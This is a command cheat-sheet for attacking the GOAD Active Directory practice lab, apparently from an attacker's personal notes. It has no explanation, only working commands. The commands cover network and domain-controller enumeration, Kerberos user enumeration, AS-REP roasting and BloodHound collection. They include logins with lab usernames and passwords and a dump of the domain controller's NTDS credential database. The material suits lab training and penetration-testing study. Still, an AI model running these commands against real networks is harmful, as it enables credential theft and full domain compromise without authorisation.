# GOAD
% GOAD

## Enumerate the network
#platform/linux #target/remote #cat/POST1
```
cme smb 192.168.56.1/24
```

## Enumerate DC
#platform/linux #target/remote #cat/POST1
```
nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
```

## Get TGT for Arya Stark
#platform/linux #target/remote #cat/POST1
```
getTGT.py north.sevenkingdoms.local/arya.stark:Needle
```

## Check if anonymous logon is allowed on any DC
#platform/linux #target/remote #cat/POST2
```
cme smb 192.168.56.10-12 --users
```

## List if any shares are accessible with guest access
#platform/linux #target/remote #cat/POST2
```
cme smb 192.168.56.10-23 -u 'a' -p '' --shares
```

## User enumeration with Kerberos based on wordlist
#platform/linux #target/remote #cat/POST2
```
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain|essos.local>',userdb=raw_users.txt" <target_ip|192.168.56.12>
```

## Check all identified users for ASREProast
#platform/linux #target/remote #cat/POST2
```
impacket-GetNPUsers north.sevenkingdoms.local/ -no-pass -usersfile users.txt
```

## Run Bloodhound Python ingestor against KINGSLANDING with user brandon.stark
#platform/linux #target/remote #cat/POST3
```
bloodhound-python --zip -c All -d sevenkingdoms.local -u brandon.stark@north.sevenkingdoms.local -p iseedeadpeople -dc kingslanding.sevenkingdoms.local
```

## Check all users in all domains as brandon.stark
#platform/linux #target/remote #cat/POST3
```
cme smb 192.168.56.10-12 -u brandon.stark -p 'iseedeadpeople' --users -d north.sevenkingdoms.local
```

## Check all users in all domains as khal.drogo
#platform/linux #target/remote #cat/POST3
```
cme smb 192.168.56.10-12 -u khal.drogo -p 'horse' --users -d essos.local
```


## Dumping DC NTDS database
#platform/linux #target/remote #cat/POST5
```
cme smb winterfell.north.sevenkingdoms.local -u vagrant -p 'vagrant' --ntds
```